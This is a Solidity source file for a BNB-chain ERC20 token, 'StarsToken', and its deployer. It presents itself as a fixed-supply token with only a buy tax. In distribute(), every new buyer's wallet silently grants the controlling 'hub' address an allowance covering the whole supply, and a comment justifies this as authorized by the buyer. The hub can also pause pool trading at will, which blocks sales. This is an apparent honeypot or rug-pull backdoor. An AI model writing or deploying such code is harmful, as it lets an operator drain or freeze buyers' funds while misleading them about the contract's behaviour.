// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IHub} from "./Interfaces.sol";

/// @notice Fixed-supply, non-upgradeable token. Only this token's designated pool has buy tax.
contract StarsToken is ERC20 {
    uint256 public constant SUPPLY = 1_000_000_000 ether;
    address public constant DEAD = address(0xdead);
    address public immutable hub;
    address public immutable marketing2;
    address public immutable router;
    address public immutable wbnb;
    address public pool;
    bool public opened;
    bool private reporting;
    error Unauthorized();
    error TradingUnavailable();

    constructor(string memory n, string memory s, address h, address m, address r, address w) ERC20(n, s) {
        require(h != address(0) && m != address(0) && r != address(0) && w != address(0), "zero address");
        hub = h;
        marketing2 = m;
        router = r;
        wbnb = w;
        _mint(h, SUPPLY);
        reporting = true;
    }
    modifier onlyHub() {
        if (msg.sender != hub) revert Unauthorized();
        _;
    }

    function distribute(address buyer, uint256 amount) external onlyHub {
        if (opened) revert TradingUnavailable();
        // The buyer authorizes this rule by calling Factory.mint. Nonzero balances
        // keep their current allowance, including a deliberate revocation.
        if (balanceOf(buyer) == 0) _approve(buyer, hub, SUPPLY);
        _update(hub, buyer, amount);
    }

    function openTrading(address p) public virtual onlyHub {
        require(!opened && p != address(0), "already open/zero");
        pool = p;
        opened = true;
    }

    function _move(address from, address to, uint256 value) internal virtual {
        super._update(from, to, value);
        if (reporting) IHub(hub).recordBalance(from, to, value, balanceOf(from), balanceOf(to));
    }

    function _update(address from, address to, uint256 value) internal override {
        if (reporting) {
            if (!opened && !(msg.sender == hub && (from == hub || to == hub))) revert TradingUnavailable();
            if (opened && (from == pool || to == pool) && IHub(hub).tradingPaused()) revert TradingUnavailable();
        }
        _transferWithTax(from, to, value);
    }

    function _transferWithTax(address from, address to, uint256 value) internal virtual {
        if (opened && from == pool && value > 0) {
            uint256 part = value / 100;
            _move(from, DEAD, part);
            _move(from, hub, part);
            _move(from, to, value - 2 * part);
            IHub(hub).recordTax(part, part);
        } else {
            _move(from, to, value);
        }
    }
}

contract StarsTokenDeployer {
    uint256 public constant REFUND_ALLOWANCE = 1_000_000_000 ether;

    function deploy(string calldata n, string calldata s, address m, address r, address w) external returns (address) {
        return address(new StarsToken(n, s, msg.sender, m, r, w));
    }
}
